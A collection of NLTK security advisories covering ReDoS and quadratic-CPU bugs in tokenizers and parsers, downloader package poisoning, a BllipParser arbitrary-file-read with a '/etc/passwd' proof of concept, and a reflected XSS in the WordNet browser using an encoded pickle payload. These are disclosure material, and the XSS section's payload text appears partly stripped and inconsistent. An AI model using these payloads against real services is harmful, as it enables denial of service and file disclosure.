The vulnerability is present in [`PunktSentenceTokenizer`](https://www.nltk.org/api/nltk.tokenize.punkt.html#nltk.tokenize.punkt.PunktSentenceTokenizer), [`sent_tokenize`](https://www.nltk.org/api/nltk.tokenize.html#nltk.tokenize.sent_tokenize)  and [`word_tokenize`](https://www.nltk.org/api/nltk.tokenize.html#nltk.tokenize.word_tokenize). Any users of this class, or these two functions, are vulnerable to a Regular Expression Denial of Service (ReDoS) attack. 
In short, a specifically crafted long input to any of these vulnerable functions will cause them to take a significant amount of execution time. The effect of this vulnerability is noticeable with the following example:
```python
from nltk.tokenize import word_tokenize

n = 8
for length in [10**i for i in range(2, n)]:
    # Prepare a malicious input
    text = "a" * length
    start_t = time.time()
    # Call `word_tokenize` and naively measure the execution time
    word_tokenize(text)
    print(f"A length of {length:<{n}} takes {time.time() - start_t:.4f}s")
```
Which gave the following output during testing:
```python
A length of 100      takes 0.0060s
A length of 1000     takes 0.0060s
A length of 10000    takes 0.6320s
A length of 100000   takes 56.3322s
...
```
I canceled the execution of the program after running it for several hours.

If your program relies on any of the vulnerable functions for tokenizing unpredictable user input, then we would strongly recommend upgrading to a version of NLTK without the vulnerability, or applying the workaround described below.

### Patches
The problem has been patched in NLTK 3.6.6. After the fix, running the above program gives the following result:
```python
A length of 100      takes 0.0070s
A length of 1000     takes 0.0010s
A length of 10000    takes 0.0060s
A length of 100000   takes 0.0400s
A length of 1000000  takes 0.3520s
A length of 10000000 takes 3.4641s
```
This output shows a linear relationship in execution time versus input length, which is desirable for regular expressions.
We recommend updating to NLTK 3.6.6+ if possible.

### Workarounds
The execution time of the vulnerable functions is exponential to the length of a malicious input. With other words, the execution time can be bounded by limiting the maximum length of an input to any of the vulnerable functions. Our recommendation is to implement such a limit.

### References
* The issue showcasing the vulnerability: https://github.com/nltk/nltk/issues/2866
* The pull request containing considerably more information on the vulnerability, and the fix: https://github.com/nltk/nltk/pull/2869
* The commit containing the fix: 1405aad979c6b8080dbbc8e0858f89b2e3690341
* Information on CWE-1333: Inefficient Regular Expression Complexity: https://cwe.mitre.org/data/definitions/1333.html

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [github.com/nltk/nltk](https://github.com/nltk/nltk)
* Email us at [nltk.team@gmail.com](mailto:nltk.team@gmail.com)

vulnerabilities.summary: NLTK: Uncontrolled resource consumption in RecursiveDescentParser via ambiguous or left-recursive grammars
vulnerabilities.details:
`nltk.parse.RecursiveDescentParser` (and `SteppingRecursiveDescentParser`) enumerate parses top-down with no bound on the number of recursive steps. A small, crafted context-free grammar makes a short input consume unbounded CPU (and/or exhaust the Python recursion stack), pinning a process indefinitely — a denial of service.

## Proof of concept

Both of the following hang on a 24-token input (killed after 8s; growth is super-linear in input length), on NLTK develop:

```python
from nltk import CFG
from nltk.parse import RecursiveDescentParser

# (a) left recursion -> unbounded recursion
g = CFG.fromstring("S -> S S | 'a'")
list(RecursiveDescentParser(g).parse(["a"] * 24))   # hangs

# (b) ambiguous grammar -> exponential number of parses
g = CFG.fromstring("S -> 'a' S | 'a' S S | 'a'")
list(RecursiveDescentParser(g).parse(["a"] * 24))   # hangs
```

## Impact

An application that runs `RecursiveDescentParser` on a grammar (or an input) drawn from an untrusted source can be driven into an unbounded CPU / stack-exhaustion loop by a tiny payload. No confidentiality or integrity impact; single-process availability only.

## Sibling

The RegexpTokenizer ReDoS reported alongside this (CVE-2026-12875) is a different class (caller-supplied regex) and is addressed under GHSA-w3v8-gmh9-3wv7.

vulnerabilities.summary: NLTK downloader allows cross-package resource and model poisoning
vulnerabilities.details: A vulnerability in `nltk.downloader` in nltk/nltk versions <= 3.9.4 allows for cross-package resource and model poisoning. The downloader extracts package archives into shared namespaces such as `corpora/` and `taggers/` instead of package-isolated roots, and validates package integrity only after the archive has been written and extracted. This design flaw enables one package to overwrite another package's trusted resources within the same namespace, making the changes immediately active through ordinary NLTK APIs. This issue persists across fresh interpreter restarts and can affect downstream workflows, including machine learning pipelines and reproducibility-sensitive environments.

vulnerabilities.summary: NLTK: Quadratic CPU exhaustion in TreebankWordTokenizer.span_tokenize via list.pop(0) in quote-restore loop
vulnerabilities.details:
## Summary

`TreebankWordTokenizer.span_tokenize` in the NLTK tokenizer package contains an unguarded O(n^2) processing loop in its quote-restoration step. When the method is invoked on text containing a long run of double-quote characters (for example `'"' * n`), it performs a `list.pop(0)` operation once per quote token, and because `list.pop(0)` is O(length), the total cost grows with the square of the input length. An attacker who can supply untrusted text to this public span-tokenization API can force a single request to saturate one CPU core for a prolonged period, degrading availability. No authentication, special configuration, or user interaction is required.

## Root Cause

Inside `span_tokenize`, when the input contains double or repeated quotes, the code builds `matched`, a list with one entry per quote occurrence, and then reconstructs tokens in a comprehension that calls `matched.pop(0)` for each token that is a quote. Removing the first element of a Python list is an O(len(list)) operation because all remaining elements are shifted. For an all-quote input the tokenizer produces n quote tokens and `matched` has n entries, so `pop(0)` is called n times, each time on a list of shrinking but still linear length, giving cumulative O(n^2) CPU work. The violated invariant is bounded per-input work: there is no length cap on `span_tokenize` or the underlying `tokenize`, so untrusted input length translates into quadratic processing time. The neighboring `align_tokens` call is linear and is not the quadratic term.

```text
Affected function: TreebankWordTokenizer.span_tokenize
Source: nltk/tokenize/treebank.py
  - branch selector at line 203
  - matched list built at line 205
  - quadratic sink matched.pop(0) at line 209
  - linear align_tokens call at line 215
```

## Impact

An attacker who controls text passed to `TreebankWordTokenizer.span_tokenize` can trigger quadratic CPU work. In the reviewed release, an all-quote input of 128,000 characters takes about 1.76 seconds and 256,000 characters about 6.57 seconds on a single core, with cost growing as the square of the length. Memory use is linear. The demonstrated capability is single-core CPU exhaustion producing denial of service or latency degradation in any network-reachable component that uses span tokenization on untrusted input, such as offset, annotation, or highlighting pipelines. There is no confidentiality or integrity impact. The plausible operational consequence, where multiple concurrent requests are used, is worker-pool exhaustion; this is inferred from the measured per-request cost and was not executed against a live deployment.

## Proof of Concept

`Requires only the released nltk package; no corpus download is needed.`

1. Instantiate `TreebankWordTokenizer`.
2. Call `span_tokenize` on an all-double-quote string of increasing length and time each call.
3. Compare against an equal-token-count control input that avoids the quote branch.

```python
import time
from nltk.tokenize import TreebankWordTokenizer

tok = TreebankWordTokenizer()
for n in (32000, 64000, 128000, 256000):
    payload = '"' * n
    start = time.perf_counter()
    list(tok.span_tokenize(payload))
    print("quote-run", n, round(time.perf_counter() - start, 3))

control = "a " * 128000  # comparable token count, avoids the pop(0) branch
start = time.perf_counter()
list(tok.span_tokenize(control))
print("control", round(time.perf_counter() - start, 3))
```

```text
quote-run 32000 0.23
quote-run 64000 0.52
quote-run 128000 1.76
quote-run 256000 6.57   (about 4x per doubling => O(n^2))
control 0.16            (roughly 11x faster, isolates pop(0))
```

## Attack Chain

1. **Exposure:** `TreebankWordTokenizer` is exported from `nltk.tokenize` and `span_tokenize` is a public, documented method reachable by any service that span-tokenizes untrusted text.
2. **Control:** The attacker fully controls the `text` argument; a run of double-quote characters such as `'"' * n` survives to the quote branch unchanged.
3. **Path:** The branch selector at line 203 (`'"' in text` or `"''" in text`) is satisfied by the payload, entering the vulnerable branch; `matched` is built at line 205 with n entries and the reconstruction comprehension runs at line 209.
4. **Guard:** There is no length cap on `span_tokenize` or `tokenize`. The regex timeout backstop in `nltk/redos.py` only wraps regular-expression operations and does not cover the pure-Python `list.pop(0)` sink; a 256,000-character input ran to completion in 6.57 seconds with no timeout raised.
5. **Primitive:** `matched.pop(0)` executed once per quote token, each call O(len(matched)), yields cumulative O(n^2) CPU work.
6. **Result:** A single request with a large quote-run input exhausts one CPU core for a sustained period, degrading service availability.

## Bypass Evidence

No guard blocks this path. Direct inspection found no `MAX_TOKEN_LEN` or length check in `nltk/tokenize/treebank.py`, in contrast to the sibling `sonority_sequencing.py` which does cap token length. The strongest refutations were attempted and failed: (1) the hypothesis that `tokenize` collapses repeated quotes so few `pop(0)` calls occur was disproven by observing that `tokenize('"' * n)` yields exactly n quote tokens and timing showing about 4x growth per doubling, while an equal-token-count non-quote control ran roughly 11x faster; (2) the hypothesis that the project regex-timeout backstop already caps this cost was disproven by running a 256,000-character input to normal completion in 6.57 seconds with no `TimeoutError`, confirming the backstop wraps only regex operations and not `list.pop(0)`; (3) the hypothesis that this line was already audited was disproven, since the project quadratic-DoS test suite explicitly clears the neighboring `align_tokens` line reached through `span_tokenize` but contains no test for the `pop(0)` loop, an audited-neighbor pattern where the adjacent line was checked and this one was missed. The seed remediation touched a different module and no advisory covers this sink.

## Affected Versions

- `Ecosystem: pip`
- `Package: nltk`
- `Confirmed affected range: >= 3.2.5, <= 3.10.3`
- `Latest release checked: 3.10.3 (PyPI)`
- `Fix status: not fixed`

The vulnerable `pop(0)` loop is present and unguarded in the current released artifact 3.10.3, verified by direct source inspection and by reproducing the quadratic curve through fresh execution. The lower bound of 3.2.5 reflects when the affected quote-restoration code shipped; the disclosure-relevant fact is that the latest published release is affected and no fix has been released.

## Suggested Fix

Replace the O(n) `list.pop(0)` pattern with an O(1) consumption strategy, for example iterating over `matched` with an index or an iterator, or using `collections.deque` with `popleft()`, so that the quote-restoration step runs in linear time overall. Additionally, consider enforcing a configurable maximum input length in `span_tokenize` consistent with the caps applied to sibling tokenizers, and ensure the fix covers all callers that pass untrusted text. As an interim mitigation, deployments that expose span tokenization of untrusted input can cap request and input sizes at the application boundary to bound the worst-case length.

Reported by zx (GitHub: @manus-pi).

## Fix status (2026-09-28)

Two pull requests carry a fix.

PR: #3753 "[Do not merge yet] Fix GHSA-8mgp-746c-j5xp: URL-scheme bypass of pathsec.validate_path", open; head da55cab0e at the time of this note (a develop merge on top of 238f81500, the head on which the verdicts below were measured). Fix commit: cf12a5e6a (the quote-restore loop in tokenize/treebank.py and tokenize/destructive.py iterates forward instead of list.pop(0)).

PR: #3895 "[WIP] Bound algorithmic-DoS and uncontrolled-recursion vectors (CWE-400/407/674/1333)", open, head b22ebe144. Fix commit: e20c40e26 "Bound tokenizer/parser algorithmic DoS (ffr9/gpwc/8fx7)".

No probe. The advisory PoC re-run (span_tokenize over 32k and 128k double quotes): #3753 head 3.5x over a 4x input, #3895 head 3.2x, both linear. On develop 2fa3f48fe the 128k run did not finish within 120 s, so develop is still VULNERABLE.

vulnerabilities.summary: Natural Language Toolkit (NLTK): ReDoS in NLTK ReviewsCorpusReader FEATURES regex
vulnerabilities.details:
### Summary
`ReviewsCorpusReader` extracts feature annotations of the form *label* followed by a bracketed signed digit (e.g. a label then `[+2]`) from each review line, using the module-level `FEATURES` regex. The feature-label sub-pattern is unbounded — an optional greedy run of word-plus-whitespace groups followed by another word, which must then be followed by a literal `[`. On a long bracket-less line the label can match from every search position to the end of the line, causing quadratic backtracking. A single crafted line in a reviews corpus hangs `reviews()`, `features()`, and `sents()`. 


### Details
The label alternative is a greedy, unanchored run of word-plus-whitespace groups followed by a word, which must then be followed by a literal `[`. On an input that is a long sequence of word-plus-whitespace with no bracket, at each of the *n* starting positions the engine greedily extends the label to the end of the line, only then fails to find the bracket, and backtracks the whole way. `re.findall` repeats this from every position, giving O(n²) total work. There is no exponential blow-up, but quadratic growth on an attacker-controlled line length is enough to hang the reader: a single line of ~100,000 words consumes CPU for tens of seconds to minutes.

### PoC
```
import multiprocessing as mp
import re
import time

# --- The vulnerable regex, verbatim from nltk/corpus/reader/reviews.py L70-71 ---
FEATURES_VULN = re.compile(r"((?:(?:\w+\s)+)?\w+)\[((?:\+|\-)\d)\]")

# --- Bounded variant from the fix (PR #3583): cap the per-label word run.
#     A generous bound (real feature labels are short noun phrases) makes the
#     run linear while never affecting legitimate corpora. ---
WORD_BOUND = 50
FEATURES_FIXED = re.compile(
    r"((?:(?:\w+\s){0,%d})?\w+)\[((?:\+|\-)\d)\]" % WORD_BOUND
)

TIMEOUT = 20.0  # seconds, per measurement
SIZES = [1000, 2000, 4000, 8000, 16000]  # words on a single bracket-less line


def _bad_line(n_words):
    """A long line of plain words with NO trailing bracketed annotation."""
    return ("word " * n_words).rstrip()


def _worker(pattern_str, line, q):
    pat = re.compile(pattern_str)
    t0 = time.perf_counter()
    pat.findall(line)
    q.put(time.perf_counter() - t0)


def timed_findall(pattern, line, timeout=TIMEOUT):
    """Run pattern.findall(line) in a killable process; return seconds or None (timeout)."""
    q = mp.Queue()
    p = mp.Process(target=_worker, args=(pattern.pattern, line, q))
    p.start()
    p.join(timeout)
    if p.is_alive():
        p.terminate()
        p.join()
        return None
    return q.get() if not q.empty() else None


def bench(label, pattern):
    print(f"\n[{label}]  pattern: {pattern.pattern}")
    print(f"  {'words':>7} {'~bytes':>8}   {'time':>12}   {'x prev':>7}")
    prev = None
    for n in SIZES:
        line = _bad_line(n)
        t = timed_findall(pattern, line)
        if t is None:
            print(f"  {n:>7} {len(line):>8}   {'>%.0fs TIMEOUT' % TIMEOUT:>12}   {'--':>7}")
            prev = None
        else:
            ratio = f"{t/prev:.1f}x" if prev else "--"
            print(f"  {n:>7} {len(line):>8}   {t*1000:>9.1f} ms   {ratio:>7}")
            prev = t


def parity_check():
    """The bound must NOT change extraction on a realistic annotated line."""
    real = (
        "the picture quality[+2] and battery life[+1] are great but "
        "the lens cap[-1] feels cheap and the menu system[-2] is slow"
    )
    a = FEATURES_VULN.findall(real)
    b = FEATURES_FIXED.findall(real)
    print("\n[parity] realistic annotated line — extraction must be identical")
    print(f"  vulnerable regex -> {a}")
    print(f"  bounded   regex  -> {b}")
    print(f"  identical: {a == b}")
    return a == b


def main():
    print("=" * 66)
    print(" NLTK ReviewsCorpusReader FEATURES ReDoS PoC (quadratic backtracking)")
    print("=" * 66)
    print(f" per-call timeout = {TIMEOUT:.0f}s   word bound (fix) = {WORD_BOUND}")

    bench("VULNERABLE  reviews.py L70-71", FEATURES_VULN)
    bench("BOUNDED     fix #3583", FEATURES_FIXED)
    same = parity_check()

    print("\n" + "=" * 66)
    print(" Vulnerable: ~4x time per input doubling  => O(n^2) quadratic ReDoS")
    print(" Bounded:    ~2x time per input doubling  => O(n)   linear, stays in ms")
    print(f" Extraction parity on real annotations preserved: {same}")
    print(" A single ~100k-word bracket-less review line hangs reviews()/features()/sents().")
    print("=" * 66)


if __name__ == "__main__":
    main()
```

### Impact
Denial of service. Processing a single crafted line through `ReviewsCorpusReader` consumes CPU quadratically in the line length, hanging the calling thread or process. An application that loads an untrusted or user-supplied reviews corpus (multi-tenant pipelines, services that accept user-provided corpora, batch or CI jobs) can be stalled by one malicious line, with no authentication and no privileges required.

vulnerabilities.summary: NLTK: BllipParser passes caller-supplied model paths to the bllipparser C extension with no pathsec check, enabling arbitrary read
vulnerabilities.details:
## Summary

`BllipParser` in `nltk/parse/bllip.py` hands caller-supplied filesystem paths to the native `bllipparser` C extension without routing them through NLTK's `pathsec` validation. The constructor parameters `parser_model`, `reranker_features`, and `reranker_weights`, and the alternative `from_unified_model_dir()` entry point, flow directly to the C extension's `load_parser_model()` and `load_reranker_model()` calls, which open and read the given path at the OS level. Any application that passes an attacker-influenced path to this API reads a file of the attacker's choosing from anywhere on the filesystem, outside the NLTK data roots that every other NLTK tool wrapper confines access to.

## Root Cause

As of NLTK 3.10.0, `SECURITY.md` documents a centralized I/O security module (`nltk.pathsec`) with strict enforcement enabled by default, under which file-backed resources must resolve inside allowed NLTK data directories. For paths handed to external tools and native extensions that open files themselves, the module provides `validate_tool_path()`, which runs name-safety checks, rejects option-shaped, URL-shaped, and traversal inputs, opens the path with `O_NOFOLLOW` requiring a regular single-linked file, and returns the validated string the caller must use. Every sibling tool wrapper applies it. `BllipParser` applies none of it: the module imports only `ParserI`, `safe_print`, and `Tree`, with zero `pathsec` references, so the three model-path parameters reach the C extension unchecked. The violated invariant is that NLTK tool wrappers must bound caller-supplied native-tool paths to the data roots before the native code opens them.

```text
nltk/parse/bllip.py:125-131   BllipParser.__init__ accepts parser_model,
                              reranker_features, reranker_weights (no validation)
nltk/parse/bllip.py:164       self.rrp.load_parser_model(parser_model, ...)   -> C extension open
nltk/parse/bllip.py:166-170   self.rrp.load_reranker_model(features_filename=...,
                              weights_filename=...)                          -> C extension open
nltk/parse/bllip.py:218-255   from_unified_model_dir(model_dir) -> __init__ (no validation)
nltk/parse/bllip.py:9-11      imports: ParserI, safe_print, Tree (no pathsec import)
```

## Impact

An application that uses `BllipParser` (requiring the optional `bllipparser` package to be installed) and that passes a model path derived from untrusted input to the constructor or to `from_unified_model_dir()` allows that input to designate an arbitrary filesystem path. The native extension opens and reads the designated file into process memory to parse it as model data. This defeats the pathsec data-root confinement that NLTK applies to all other native-tool model loads. The attacker-controlled path can target files outside the NLTK data directories, for example local configuration or credential files readable by the process. Content disclosure to the attacker depends on how the application surfaces parser errors or results; file existence, size, and open behavior provide an oracle regardless. Because the same unvalidated path also skips the checks that refuse a non-regular file or an over-large model, the attacker can instead designate a FIFO, socket, device, or directory, or an oversized regular file, so the native load blocks or reads unbounded data into memory and the component performing the parse suffers reduced performance or a stalled worker. The primitive demonstrated by source analysis is attacker control of which file the process opens and reads.

## Proof of Concept

```text
Requires the optional bllipparser C extension to be installed
(pip install bllipparser) so that RerankingParser.load_parser_model
is available. No NLTK data download is needed to exercise the path.
```

```python
# An application forwards an untrusted "model" path into BllipParser.
from nltk.parse.bllip import BllipParser

# Attacker-controlled value reaches the constructor unchanged.
untrusted_path = "/etc/passwd"
BllipParser(parser_model=untrusted_path)
# The bllipparser C extension opens and reads untrusted_path at the OS
# level with no NLTK pathsec confinement to the data roots.
```

```text
Structural confirmation without the optional extension installed:

$ grep -n "pathsec\|validate_path\|validate_tool" nltk/parse/bllip.py
(no output)

$ grep -n "validate_tool_path" nltk/tag/crf.py nltk/tag/hunpos.py \
      nltk/tag/stanford.py nltk/parse/malt.py
nltk/tag/crf.py:140
nltk/tag/crf.py:311
nltk/tag/hunpos.py:111
nltk/tag/stanford.py:85
nltk/tag/stanford.py:137
nltk/parse/malt.py:340
nltk/parse/malt.py:344

BllipParser is the only native-tool wrapper with no validate_tool_path call.
```

## Attack Chain

1. **Exposure:** An application imports `BllipParser` (exported at `nltk/parse/bllip.py:83` and re-exported at `nltk/parse/__init__.py:47`) and constructs it with a model path influenced by untrusted input.
2. **Control:** The attacker controls the `parser_model`, `reranker_features`, or `reranker_weights` string (or the `model_dir` passed to `from_unified_model_dir()` at `nltk/parse/bllip.py:218`); it is accepted as an arbitrary string with no type or content constraint.
3. **Path:** The value flows unchanged from `BllipParser.__init__` (`nltk/parse/bllip.py:125`) to `self.rrp.load_parser_model(parser_model, ...)` at `nltk/parse/bllip.py:164`, and the reranker values to `self.rrp.load_reranker_model(...)` at `nltk/parse/bllip.py:166-170`.
4. **Guard:** No pathsec guard is present on this path. `nltk/parse/bllip.py` imports no pathsec symbol, so `validate_tool_path()` (the guard applied by every sibling wrapper) is never invoked before the native open.
5. **Primitive:** The `bllipparser` C extension performs an OS-level open and read of the supplied path to parse model data, reaching the filesystem directly.
6. **Result:** A file at an attacker-chosen path, including locations outside the NLTK data roots, is opened and read by the process, bypassing the pathsec data-root confinement enforced elsewhere.

## Bypass Evidence

The relevant protection is `nltk.pathsec.validate_tool_path()` (`nltk/pathsec.py:950`), documented as bounding "a filesystem path handed to an external tool to read or write" and designed exactly for native loaders that open the file themselves. The strongest counter-argument is that `SECURITY.md` disclaims being "a general operating-system sandbox" and does "not prevent all unsafe behavior an application might perform outside NLTK." That disclaimer concerns application code outside NLTK, not NLTK's own tool wrappers: the project added `validate_tool_path()` and applied it to `CRFTagger.set_model_file()` (`nltk/tag/crf.py:140`), `HunposTagger` (`nltk/tag/hunpos.py:111`), `StanfordTagger` (`nltk/tag/stanford.py:85,137`), and `MaltParser` (`nltk/parse/malt.py:340,344`), with the CRFTagger and HunposTagger wrappers citing a prior tool-path advisory and explaining that `pathsec.open` cannot be used because the C extension does its own open. `BllipParser` is the single native-tool wrapper that omits the guard. The alternative `from_unified_model_dir()` path offers no mitigation: `get_unified_model_parameters()` belongs to the third-party `bllipparser` package and performs no NLTK data-root validation, so the derived sub-paths reach the constructor and the C extension unchecked.

## Affected Versions

- **Ecosystem:** `pip`
- **Package:** `nltk`
- **Confirmed affected range:** `>= 3.10.0, <= 3.10.3`
- **Latest release checked:** `3.10.3` ([PyPI](https://pypi.org/project/nltk/3.10.3/))
- **Fix status:** 3.10.4

The lower bound is 3.10.0 because the pathsec enforcement model and the `validate_tool_path()` guard were introduced in that release; before 3.10.0 no such boundary existed for NLTK to violate. The missing validation persists unchanged through 3.10.3, the current PyPI release, and on the repository default branch (no `pathsec`, `validate_path`, or `validate_tool` reference exists in `nltk/parse/bllip.py`). No fixed release is established.

## Suggested Fix

Validate every caller-supplied native-tool path in `BllipParser` before it reaches the `bllipparser` C extension, matching the pattern already used by the other wrappers. In `BllipParser.__init__`, pass `parser_model`, `reranker_features`, and `reranker_weights` through `nltk.pathsec.validate_tool_path()` (with `max_bytes=MAX_TOOL_MODEL_BYTES` and `require_private=True`, as `CRFTagger.set_model_file()` does) and build the C-extension arguments from the returned strings so a path swapped after the check is not reopened. Because `parser_model` denotes a model directory for this loader, the fix must cover the directory argument and the reranker file arguments, and should apply equally to the paths derived inside `from_unified_model_dir()`. As an interim measure, applications should refuse to pass untrusted input as any `BllipParser` model path and should load models only through `nltk.data.find()`, which already enforces pathsec confinement.

---

Reported by zx.

vulnerabilities.summary: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') in nltk
vulnerabilities.details: ### Summary `nltk.app.wordnet_app` contains a reflected cross-site scripting issue in the `lookup_...` route. A crafted `lookup_` URL can inject arbitrary HTML/JavaScript into the response page because attacker-controlled `word` data is reflected into HTML without escaping. This impacts users running the local WordNet Browser server and can lead to script execution in the browser origin of that application. ### Details The vulnerable flow is in `nltk/app/wordnet_app.py`: - [`nltk/app/wordnet_app.py:144`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L144) - Requests starting with `lookup_` are handled as HTML responses: - `page, word = page_from_href(sp)` - [`nltk/app/wordnet_app.py:755`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L755) - `page_from_href()` calls `page_from_reference(Reference.decode(href))` - [`nltk/app/wordnet_app.py:769`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L769) - `word = href.word` - [`nltk/app/wordnet_app.py:796`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L796) - If no results are found, `word` is inserted directly into the HTML body: - `body = "The word or words '%s' were not found in the dictionary." % word` This is inconsistent with the `search` route, which does escape user input: - [`nltk/app/wordnet_app.py:136`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L136) - `word = html.escape(...)` As a result, a malicious `lookup_...` payload can inject script into the response page. The issue is exploitable because: - `Reference.decode()` accepts attacker-controlled base64-encoded pickle data for the URL state. - The decoded `word` is reflected into HTML without `html.escape()`. - The server is started with `HTTPServer(("", port), MyServerHandler)`, so it listens on all interfaces by default, not just `localhost`. ### PoC 1. Start the WordNet Browser in an isolated Docker environment: ```bash docker run -d --name nltk-wordnet-web -p 8002:8002 \ nltk-sandbox \ python -c "import nltk; nltk.download('wordnet', quiet=True); from nltk.app.wordnet_app import wnb; wnb(8002, False)" ``` 2. Use the following crafted payload, which decodes to: ```python ("", {}) ``` Encoded payload: ```text gAWVIQAAAAAAAACMGTxzY3JpcHQ-YWxlcnQoMSk8L3NjcmlwdD6UfZSGlC4= ``` 3. Request the vulnerable route: ```bash curl -s "http://127.0.0.1:8002/lookup_gAWVIQAAAAAAAACMGTxzY3JpcHQ-YWxlcnQoMSk8L3NjcmlwdD6UfZSGlC4=" ``` 4. Observed result: ```text The word or words '' were not found in the dictionary. ``` I also validated the issue directly at function level in Docker: ```python import base64 import pickle from nltk.app.wordnet_app import page_from_href payload = base64.urlsafe_b64encode( pickle.dumps(("", {}), -1) ).decode() page, word = page_from_href(payload) print(word) print("" in page) ``` Observed output: ```text WORD= HAS_SCRIPT= True ``` ### Impact This is a reflected XSS issue in the NLTK WordNet Browser web UI. An attacker who can convince a user to open a crafted `lookup_...` URL can execute arbitrary JavaScript in the origin of the local WordNet Browser application. This can be used to: - run arbitrary script in the browser tab - manipulate the page content shown to the user - issue same-origin requests to other WordNet Browser routes - potentially trigger available UI actions in that local app context This primarily impacts users who run `nltk.app.wordnet_app` as a local or self-hosted HTTP service and open attacker-controlled links.

vulnerabilities.summary: NLTK: Quadratic CPU exhaustion in LegalitySyllableTokenizer.tokenize via unguarded onset reversal loop
vulnerabilities.details:
## Summary

`LegalitySyllableTokenizer.tokenize` in the NLTK tokenizer package contains an unguarded O(n^2) processing loop. When the method is called on a single token that consists of a long run of vowels (for example `"a" * n`), it consumes CPU time proportional to the square of the token length. An attacker who can supply an untrusted token to this public tokenizer API can force a single request to saturate one CPU core for a prolonged period, degrading availability of any service that syllabifies attacker-controlled text. No authentication, special configuration, or user interaction is required.

## Root Cause

The method walks the token in reverse and, on every iteration after the first vowel is seen, evaluates the membership test `char_lower + current_onset[::-1] in self.legal_onsets`. The set `legal_onsets` is built by `onset()`, which returns only the characters up to the first vowel, so every member is vowel-free. For an all-vowel token the first branch can therefore never match, `onset` never becomes `True`, and the reset branch that would clear `current_onset` is never reached. As a result `current_onset` grows by one character on every iteration. Building `current_onset[::-1]` and hashing the resulting string costs O(k) on iteration k, and this is repeated for k from 1 to n, giving total cost O(n^2). The security invariant that is violated is bounded per-token work: there is no length cap on this code path, so untrusted token length translates directly into quadratic CPU consumption.

```text
Affected function: LegalitySyllableTokenizer.tokenize
Source: nltk/tokenize/legality_principle.py (membership-test sink at line 133; loop over token[::-1] beginning at line 126)
Helper establishing the vowel-free onset set: LegalitySyllableTokenizer.onset (nltk/tokenize/legality_principle.py, returns prefix up to first vowel)
```

## Impact

An attacker who controls a token passed to `LegalitySyllableTokenizer.tokenize` can trigger quadratic CPU work. In the reviewed release a token of roughly 64,000 vowel characters takes about 1.8 seconds on a single core, and the cost grows with the square of the length, so a token in the hundreds of kilobytes to megabyte range consumes a core for many seconds to minutes. Memory use is linear. The demonstrated capability is single-core CPU exhaustion leading to denial of service or latency degradation in any network-reachable component that syllabifies untrusted input. There is no confidentiality or integrity impact; the effect is availability degradation of the affected process. The plausible operational consequence, where multiple concurrent requests are used, is exhaustion of the available worker pool; this is inferred from the per-request cost and was not itself executed against a live deployment.

## Proof of Concept

`Requires only the released nltk package; no corpus download is needed because the quadratic behavior is driven entirely by the attacker token, not by the size of the legal-onset set.`

1. Construct a tokenizer with any small onset source.
2. Call `tokenize` with an all-vowel token of increasing length and time each call.
3. Compare against a consonant-alternating control token of equal length.

```python
import time
from nltk.tokenize import LegalitySyllableTokenizer

tok = LegalitySyllableTokenizer("tr c d".split())  # tiny 3-word onset source
for n in (8000, 16000, 32000):
    payload = "a" * n
    start = time.perf_counter()
    tok.tokenize(payload)
    print("vowel-run", n, round(time.perf_counter() - start, 3))

control = "ba" * 32000  # equal-length linear control
start = time.perf_counter()
tok.tokenize(control)
print("control", 64000, round(time.perf_counter() - start, 3))
```

```text
vowel-run 8000 0.031
vowel-run 16000 0.120
vowel-run 32000 0.468   (about 4x per doubling => O(n^2))
control 64000 0.004     (linear, roughly 130x faster at larger size)
```

## Attack Chain

1. **Exposure:** `LegalitySyllableTokenizer` is exported from `nltk.tokenize` and `tokenize` is a public, documented method reachable by any service that syllabifies untrusted text.
2. **Control:** The attacker fully controls the `token` argument, including its length and character content; a run of vowels such as `"a" * n` survives with no normalization or length reduction.
3. **Path:** The token flows into the reverse walk at `nltk/tokenize/legality_principle.py:126` and reaches the membership-test at line 133 on every iteration past the first vowel.
4. **Guard:** There is no length cap on this path. The sibling `SyllableTokenizer` received a `MAX_TOKEN_LEN` cap during the project hardening work, but `legality_principle.py` received no such guard.
5. **Primitive:** Repeated O(k) construction and hashing of `current_onset[::-1]` inside the loop yields cumulative O(n^2) CPU work.
6. **Result:** A single request with a large vowel-run token exhausts one CPU core for a sustained period, degrading service availability.

## Bypass Evidence

No guard blocks this path. Membership-set analysis shows the first branch at line 133 cannot fire for a vowel character because `legal_onsets` is provably vowel-free (it is derived from `onset()`, which stops at the first vowel), so `onset` never becomes `True` and `current_onset` is never reset. The strongest refutations were attempted and failed: (1) the hypothesis that the quadratic depends on a large or specific onset corpus was disproven by reproducing the same O(n^2) growth with a three-word onset source, showing the cost is driven solely by the attacker token; (2) the hypothesis that an upstream length cap neutralizes long tokens was disproven by direct source inspection, which found no `MAX_TOKEN_LEN` or equivalent clamp on this class and confirmed the default word-tokenization path does not call this class; (3) the hypothesis that this is covered by existing hardening was disproven, since the project quadratic-DoS test suite exercises the sibling `SyllableTokenizer` but contains no test for `LegalitySyllableTokenizer`, and no commit added a cap to this file. This is a fix-missed sibling of the accepted algorithmic-complexity class, not a previously remediated issue.

## Affected Versions

- `Ecosystem: pip`
- `Package: nltk`
- `Confirmed affected range: >= 3.6, <= 3.10.3`
- `Latest release checked: 3.10.3 (PyPI)`
- `Fix status: not fixed`

The vulnerable loop is present and unguarded in the current released artifact 3.10.3, verified by direct source inspection and by reproducing the quadratic curve. The lower bound of 3.6 reflects when the affected module first shipped; the disclosure-relevant fact is that the latest published release is affected and no fix has been released.

## Suggested Fix

Enforce a bound on per-token work in `LegalitySyllableTokenizer.tokenize`, consistent with the `MAX_TOKEN_LEN` guard already applied to the sibling `SyllableTokenizer`. Options include rejecting or truncating tokens above a configurable maximum length before the reverse walk, or restructuring the onset accumulation so the loop does not repeatedly build and hash a growing reversed string (for example by maintaining the onset in its final orientation and comparing without an O(k) reversal each iteration). The remediation should cover any caller that passes untrusted tokens, not just the default word-tokenization path. As an interim mitigation, deployments that expose syllabification of untrusted input can cap request and token sizes at the application boundary to bound the worst-case token length.

Reported by zx (GitHub: @manus-pi).

## Fix status (2026-09-28)

